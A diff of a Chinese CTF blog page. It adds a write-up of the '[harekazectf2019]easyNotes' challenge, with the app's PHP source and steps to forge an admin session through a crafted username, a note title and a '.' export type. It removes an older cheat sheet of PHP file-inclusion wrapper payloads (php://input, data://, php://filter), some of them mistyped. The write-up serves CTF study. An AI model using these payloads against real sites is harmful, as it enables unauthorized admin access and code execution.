@@ -112,6 +112,78 @@ var _hmt = _hmt || [];
 
   
     
+    <h3 class="article-title"><a href="/2025/03/15/[harekazectf2019]easyNotes/"><span>Notes</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2025/03/15/[harekazectf2019]easyNotes/" rel="bookmark">
+        <time class="entry-date published" datetime="2025-03-15T07:58:06.000Z">
+          2025-03-15
+        </time>
+      </a>
+    </span>
+    <br />
+    
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+          <h2 id="harekazectf2019-easyNotes"><a href="#harekazectf2019-easyNotes" class="headerlink" title="[harekazectf2019]easyNotes"></a>[harekazectf2019]easyNotes</h2><p style="font-size:10px;color:#7f8c93">题目来源：BUUCTF<br>
+题目类型：WEB<br>
+设计考点：Session伪造,Session反序列化</p>
+
+<p><img src="/../img/easyNotes/1.png" alt="web1"></p>
+<p><img src="/../img/easyNotes/2.png" alt="web2"><br>这是一个note服务网页，登录后可以添加note包括标题和内容，然后可以打包成ZIP或者TAR文件进行下载，题目提供了源码首先进行代码审计</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;section&gt;</span><br><span class="line">  &lt;h2&gt;Get flag&lt;/h2&gt;</span><br><span class="line">  &lt;p&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    if (is_admin()) &#123;</span><br><span class="line">      echo &quot;Congratulations! The flag is: &lt;code&gt;&quot; . getenv(&#x27;FLAG&#x27;) . &quot;&lt;/code&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &quot;You are not an admin :(&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">&lt;/section&gt;</span><br></pre></td></tr></table></figure>
+<p>通过审计该代码，我们发现当is_admin函数返回值为true时即可得到flag，我们跟进is_admin函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function is_admin() &#123;</span><br><span class="line">  if (!isset($_SESSION[&#x27;admin&#x27;])) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return $_SESSION[&#x27;admin&#x27;] === true;</span><br><span class="line">&#125;</span><br><span class="line">发现他是获取的SESSION文件中的admin值</span><br><span class="line">那么思路就是怎么伪造session</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#config.php</span><br><span class="line">&lt;?php</span><br><span class="line">define(&#x27;TEMP_DIR&#x27;, &#x27;/var/www/tmp&#x27;);</span><br></pre></td></tr></table></figure>
+<p>这个文件标识了临时文件存储路径</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">#lip.php(定义了一些函数)</span><br><span class="line">&lt;?php</span><br><span class="line">function redirect($path) &#123;</span><br><span class="line">  header(&#x27;Location: &#x27; . $path);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// utility functions</span><br><span class="line">function e($str) &#123;</span><br><span class="line">  return htmlspecialchars($str, ENT_QUOTES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// user-related functions</span><br><span class="line">function validate_user($user) &#123;</span><br><span class="line">  if (!is_string($user)) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return preg_match(&#x27;/\A[0-9A-Z_-]&#123;4,64&#125;\z/i&#x27;, $user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_logged_in() &#123;</span><br><span class="line">  return isset($_SESSION[&#x27;user&#x27;]) &amp;&amp; !empty($_SESSION[&#x27;user&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function set_user($user) &#123;</span><br><span class="line">  $_SESSION[&#x27;user&#x27;] = $user;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_user() &#123;</span><br><span class="line">  return $_SESSION[&#x27;user&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function is_admin() &#123;</span><br><span class="line">  if (!isset($_SESSION[&#x27;admin&#x27;])) &#123;</span><br><span class="line">    return false;</span><br><span class="line">  &#125;</span><br><span class="line">  return $_SESSION[&#x27;admin&#x27;] === true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// note-related functions</span><br><span class="line">function get_notes() &#123;</span><br><span class="line">  if (!isset($_SESSION[&#x27;notes&#x27;])) &#123;</span><br><span class="line">    $_SESSION[&#x27;notes&#x27;] = [];</span><br><span class="line">  &#125;</span><br><span class="line">  return $_SESSION[&#x27;notes&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function add_note($title, $body) &#123;</span><br><span class="line">  $notes = get_notes();</span><br><span class="line">  array_push($notes, [</span><br><span class="line">    &#x27;title&#x27; =&gt; $title,</span><br><span class="line">    &#x27;body&#x27; =&gt; $body,</span><br><span class="line">    &#x27;id&#x27; =&gt; hash(&#x27;sha256&#x27;, microtime())</span><br><span class="line">  ]);</span><br><span class="line">  $_SESSION[&#x27;notes&#x27;] = $notes;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function find_note($notes, $id) &#123;</span><br><span class="line">  for ($index = 0; $index &lt; count($notes); $index++) &#123;</span><br><span class="line">    if ($notes[$index][&#x27;id&#x27;] === $id) &#123;</span><br><span class="line">      return $index;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function delete_note($id) &#123;</span><br><span class="line">  $notes = get_notes();</span><br><span class="line">  $index = find_note($notes, $id);</span><br><span class="line">  if ($index !== FALSE) &#123;</span><br><span class="line">    array_splice($notes, $index, 1);</span><br><span class="line">  &#125;</span><br><span class="line">  $_SESSION[&#x27;notes&#x27;] = $notes;</span><br><span class="line">&#125;</span><br><span class="line">#init.php</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">require_once(&#x27;config.php&#x27;);</span><br><span class="line">require_once(&#x27;lib.php&#x27;);</span><br><span class="line"></span><br><span class="line">session_save_path(TEMP_DIR);#标识了session文件保存路径</span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#export.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once(&#x27;init.php&#x27;);</span><br><span class="line"></span><br><span class="line">if (!is_logged_in()) &#123;</span><br><span class="line">  redirect(&#x27;/?page=home&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$notes = get_notes();</span><br><span class="line"></span><br><span class="line">if (!isset($_GET[&#x27;type&#x27;]) || empty($_GET[&#x27;type&#x27;])) &#123;</span><br><span class="line">  $type = &#x27;zip&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  $type = $_GET[&#x27;type&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filename = get_user() . &#x27;-&#x27; . bin2hex(random_bytes(8)) . &#x27;.&#x27; . $type;</span><br><span class="line">$filename = str_replace(&#x27;..&#x27;, &#x27;&#x27;, $filename); // avoid path traversal</span><br><span class="line">$path = TEMP_DIR . &#x27;/&#x27; . $filename;</span><br><span class="line"></span><br><span class="line">if ($type === &#x27;tar&#x27;) &#123;</span><br><span class="line">  $archive = new PharData($path);</span><br><span class="line">  $archive-&gt;startBuffering();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  // use zip as default</span><br><span class="line">  $archive = new ZipArchive();</span><br><span class="line">  $archive-&gt;open($path, ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for ($index = 0; $index &lt; count($notes); $index++) &#123;</span><br><span class="line">  $note = $notes[$index];</span><br><span class="line">  $title = $note[&#x27;title&#x27;];</span><br><span class="line">  $title = preg_replace(&#x27;/[^!-~]/&#x27;, &#x27;-&#x27;, $title);</span><br><span class="line">  $title = preg_replace(&#x27;#[/\\?*.]#&#x27;, &#x27;-&#x27;, $title); // delete suspicious characters</span><br><span class="line">  $archive-&gt;addFromString(&quot;&#123;$index&#125;_&#123;$title&#125;.json&quot;, json_encode($note));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($type === &#x27;tar&#x27;) &#123;</span><br><span class="line">  $archive-&gt;stopBuffering();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  $archive-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#x27;Content-Disposition: attachment; filename=&quot;&#x27; . $filename . &#x27;&quot;;&#x27;);</span><br><span class="line">header(&#x27;Content-Length: &#x27; . filesize($path));</span><br><span class="line">header(&#x27;Content-Type: application/zip&#x27;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
+<p>可以发现session文件保存路径与note文件导出的路径一样，看看文件名的命名方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$filename = get_user() . &#x27;-&#x27; . bin2hex(random_bytes(8)) . &#x27;.&#x27; . $type;</span><br><span class="line">$filename = str_replace(&#x27;..&#x27;, &#x27;&#x27;, $filename); // avoid path traversal</span><br><span class="line">$path = TEMP_DIR . &#x27;/&#x27; . $filename;</span><br></pre></td></tr></table></figure>
+<p>通过get_user函数获取用户名然后用一段随机字符串加上文件类型，这里的get_user内容可控，登录时修改用户名即可，但是他还有type拼接且type无法为空不然就会被设置为ZIP，第二行代码中将..替换为空为了防止目录穿越，那么我们就可以让type的值为.这样filename中就有..被替换为空那么后缀名就消失了，我们成功构造出了一个符合要求的session文件名，看看内容是否可控</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for ($index = 0; $index &lt; count($notes); $index++) &#123;</span><br><span class="line">  $note = $notes[$index];</span><br><span class="line">  $title = $note[&#x27;title&#x27;];</span><br><span class="line">  $title = preg_replace(&#x27;/[^!-~]/&#x27;, &#x27;-&#x27;, $title);</span><br><span class="line">  $title = preg_replace(&#x27;#[/\\?*.]#&#x27;, &#x27;-&#x27;, $title); // delete suspicious characters</span><br><span class="line">  $archive-&gt;addFromString(&quot;&#123;$index&#125;_&#123;$title&#125;.json&quot;, json_encode($note));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>内容是可控的我们新建note的title值会被写入到文件当中，那么思路就结束了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、登录用户名设置为sess_</span><br><span class="line">2、新建note，title值为|N;admin|b:1;   (body任意)</span><br><span class="line">3、export文件，BP拦截将type值设置为.</span><br><span class="line">4、将文件名中SESS_后的字符串记录</span><br><span class="line">5、打开flag获取页面设置session值为第四步的字符串，这样他就会自动反序列化/var/www/tmp中我们植入伪造admin的文件，这样$_session[&#x27;admin&#x27;]=true从而获取flag</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+
+    </div>
+
+    
+  </div>
+  
+    
+    <h3 class="article-read"><a href="/2025/03/15/[harekazectf2019]easyNotes/"><span>more</span></a></h3>
+    
+  
+</article>
+
+
+
+
+
+  <article class="article-container ">
+
+  
+    
     <h3 class="article-title"><a href="/2025/02/17/SWPU2019-Web4/"><span>[SWPU2019]Web4</span></a></h3>
     
   
@@ -873,123 +945,6 @@ http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而
   
     
     <h3 class="article-read"><a href="/2024/07/22/Sql/"><span>more</span></a></h3>
-    
-  
-</article>
-
-
-
-
-
-  <article class="article-container ">
-
-  
-    
-    <h3 class="article-title"><a href="/2024/06/09/php伪协议/"><span>php伪协议</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2024/06/09/php伪协议/" rel="bookmark">
-        <time class="entry-date published" datetime="2024-06-09T06:09:06.000Z">
-          2024-06-09
-        </time>
-      </a>
-    </span>
-    <br />
-    
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-          <table>
-<thead>
-<tr>
-<th align="center">协议</th>
-<th align="center">测试PHP版本</th>
-<th align="center">allow_url_fopen</th>
-<th align="center">allow_url_include</th>
-<th align="center">用法</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center"><a href="#file">file:&#x2F;&#x2F;</a></td>
-<td align="center">&gt;&#x3D;5.2</td>
-<td align="center">off&#x2F;on</td>
-<td align="center">off&#x2F;on</td>
-<td align="center">?file&#x3D;file:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;phpcode.txt</td>
-</tr>
-<tr>
-<td align="center">php:&#x2F;&#x2F;filter</td>
-<td align="center">&gt;&#x3D;5.2</td>
-<td align="center">off&#x2F;on</td>
-<td align="center">off&#x2F;on</td>
-<td align="center">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php<or>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-7.UCS-4*&#x2F;resource</td>
-</tr>
-<tr>
-<td align="center"><a href="#Input">php:&#x2F;&#x2F;input</a></td>
-<td align="center">&gt;&#x3D;5.2</td>
-<td align="center">off&#x2F;on</td>
-<td align="center">on</td>
-<td align="center">?fle&#x3D;php:&#x2F;&#x2F;input 【POST DATA】<?php phpinfo()?></td>
-</tr>
-<tr>
-<td align="center">zip:&#x2F;&#x2F;</td>
-<td align="center">&gt;&#x3D;5.2</td>
-<td align="center">off&#x2F;on</td>
-<td align="center">off&#x2F;on</td>
-<td align="center">?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.zip%23phpcode.txt</td>
-</tr>
-<tr>
-<td align="center">compress.bzip2:&#x2F;&#x2F;</td>
-<td align="center">&gt;&#x3D;5.2</td>
-<td align="center">off&#x2F;on</td>
-<td align="center">off&#x2F;on</td>
-<td align="center">?hle&#x3D;compress.bzip2:&#x2F;&#x2F;D&#x2F;softphpStudy&#x2F;VW&#x2F;hle.bz2</br>【or】</br>?file&#x3D;compress.bzip2:&#x2F;&#x2F;&#x2F;file.bz2</td>
-</tr>
-<tr>
-<td align="center">compress.zlib:&#x2F;&#x2F;</td>
-<td align="center">&gt;&#x3D;5.2</td>
-<td align="center">off&#x2F;on</td>
-<td align="center">off&#x2F;on</td>
-<td align="center">?file&#x3D;compress.zlib:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WW&#x2F;file.gz【or】?file&#x3D;compress.zlib:&#x2F;&#x2F;.&#x2F;file.gz</td>
-</tr>
-<tr>
-<td align="center">data:&#x2F;&#x2F;</td>
-<td align="center">&gt;&#x3D;5.2</td>
-<td align="center">on</td>
-<td align="center">on</td>
-<td align="center">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo0?></br>【or】</br>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaWSmbygpPz4&#x3D;</br>也可以:?file&#x3D;data:text&#x2F;plain,<?php phpinfo0?></br>【or】</br>?file&#x3D;datatext&#x2F;plain:base64.PD9waHAgcGhwaW5mbyqpPz4&#x3D;</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p><em>file</em>为待传的变量名</br><br>变量名&#x3D;php:&#x2F;&#x2F;input然后post想运行的语句</br><br>场景:文件包含</br><br>建议使用burpsuite</br></p>
-<h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>用于访问服务端本地的文件</br><br>用法：变量&#x3D;file:&#x2F;&#x2F;文件地址</br><br>场景:文件包含</p>
-
-      
-    </div>
-    
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-
-    </div>
-
-    
-  </div>
-  
-    
-    <h3 class="article-read"><a href="/2024/06/09/php伪协议/"><span>more</span></a></h3>
     
   
 </article>
